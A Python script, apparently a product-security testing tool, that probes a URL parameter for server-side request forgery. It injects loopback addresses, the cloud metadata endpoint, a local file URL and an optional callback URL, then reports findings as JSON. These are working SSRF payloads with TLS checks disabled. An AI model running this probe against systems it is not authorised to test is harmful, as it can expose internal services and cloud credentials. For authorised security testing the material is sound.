#!/usr/bin/env python3
"""
Probe a URL-fetching parameter for SSRF indicators.

The script injects loopback, metadata, and controlled external URLs and compares
status, length, and timing. A positive result is server-side fetch behavior to
private/link-local addresses, callback evidence, or distinct internal banners.
"""
import argparse
import json
import ssl
import sys
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"


def mutate(url, param, value):
    parts = urlsplit(url)
    qs = dict(parse_qsl(parts.query, keep_blank_values=True))
    qs[param] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(qs), parts.fragment))


def fetch(url, timeout):
    req = Request(url, headers={"User-Agent": "prod-sec-ssrf-probe/1.0", "X-ProdSec-Canary": "ssrf"})
    start = time.monotonic()
    try:
        with urlopen(req, timeout=timeout, context=ssl._create_unverified_context()) as resp:
            body = resp.read(120000).decode("utf-8", "replace")
            return resp.status, len(body), body[:500], time.monotonic() - start, None
    except HTTPError as exc:
        body = exc.read(120000).decode("utf-8", "replace")
        return exc.code, len(body), body[:500], time.monotonic() - start, None
    except (URLError, TimeoutError, ssl.SSLError) as exc:
        return 0, 0, "", time.monotonic() - start, str(exc)


def main():
    parser = argparse.ArgumentParser(description="Probe a URL parameter for SSRF behavior.")
    parser.add_argument("target_url")
    parser.add_argument("--param", required=True)
    parser.add_argument("--callback-url", help="Owned callback URL for OOB confirmation.")
    parser.add_argument("--safe-mode", action="store_true", help="Avoid high-risk schemes and use short timeouts.")
    parser.add_argument("--timeout", type=float, default=6)
    args = parser.parse_args()

    payloads = ["https://example.com/", "http://127.0.0.1/", "http://localhost/", "http://[::1]/"]
    if args.callback_url:
        payloads.append(args.callback_url)
    if not args.safe_mode:
        payloads.extend(["http://169.254.169.254/latest/meta-data/", "file:///etc/hostname"])

    findings = []
    observations = []
    for payload in payloads:
        url = mutate(args.target_url, args.param, payload)
        status, length, body, elapsed, error = fetch(url, args.timeout)
        if error:
            print(f"{RED}[ERROR]{RESET} payload={payload} error={error}")
            observations.append({"payload": payload, "error": error})
            continue
        print(f"{GREEN}[TEST]{RESET} payload={payload} status={status} len={length} time={elapsed:.2f}s")
        obs = {"payload": payload, "status": status, "length": length, "time": round(elapsed, 3)}
        if payload.startswith("http://127.") or "localhost" in payload or "[::1]" in payload:
            if status < 500 and length > 0:
                obs["indicator"] = "private_fetch_response"
                findings.append({"title": "Possible SSRF to loopback", "severity": "High", "evidence": f"{payload} produced HTTP {status} with {length} bytes", "poc": url, "status": "Unconfirmed until internal response is validated"})
                print(f"{YELLOW}[FINDING]{RESET} loopback payload produced response")
        if "ami-id" in body.lower() or "instance-id" in body.lower():
            findings.append({"title": "SSRF exposed cloud metadata", "severity": "Critical", "evidence": body[:200], "poc": url, "status": "Confirmed"})
            print(f"{YELLOW}[FINDING]{RESET} metadata marker observed")
        observations.append(obs)

    print("JSON_SNIPPET:", json.dumps({"tool": "ssrf_probe", "target": args.target_url, "param": args.param, "findings": findings, "observations": observations}, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
